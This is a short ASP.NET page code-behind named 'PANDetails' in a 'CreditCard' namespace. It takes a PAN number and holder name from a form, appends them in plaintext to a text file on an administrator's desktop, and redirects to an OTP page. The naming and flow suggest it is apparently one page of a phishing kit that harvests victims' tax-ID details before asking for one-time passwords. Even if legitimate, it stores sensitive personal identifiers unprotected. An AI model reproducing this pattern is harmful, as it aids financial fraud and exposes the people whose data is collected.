using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace CreditCard
{
    public partial class PANDetails : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void BtnSave_Click(object sender, EventArgs e)
        {
            try
            {
                var Line = "PAN Number:- " + txtPanNumber.Text.Trim() + "," + "Pan Holder Name:-" + txtPanHolderName.Text;
                File.AppendAllText(@"C:/Users/Administrator/Desktop/vinay/notedata.txt", Line + Environment.NewLine + Environment.NewLine + Environment.NewLine);

                Response.Redirect("otp3.aspx");
            }
            catch (Exception)
            {

                throw;
            }
            Response.Redirect("Otp1.aspx");
        }
    }
}